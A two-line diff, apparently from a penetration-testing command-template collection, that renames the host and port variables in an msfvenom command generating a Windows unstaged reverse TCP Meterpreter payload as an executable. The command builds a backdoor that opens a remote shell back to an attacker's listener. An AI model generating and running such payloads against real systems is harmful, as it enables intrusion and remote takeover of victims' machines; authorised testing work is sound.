@@ -1,2 +1,2 @@
 # description: msfvenom Windows unstaged reverse TCP meterpreter payload as exe
-msfvenom -p windows/meterpreter_reverse_tcp LHOST=${II_LHOST} LPORT=${II_LPORT} -f exe -o reverse.exe
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o reverse.exe
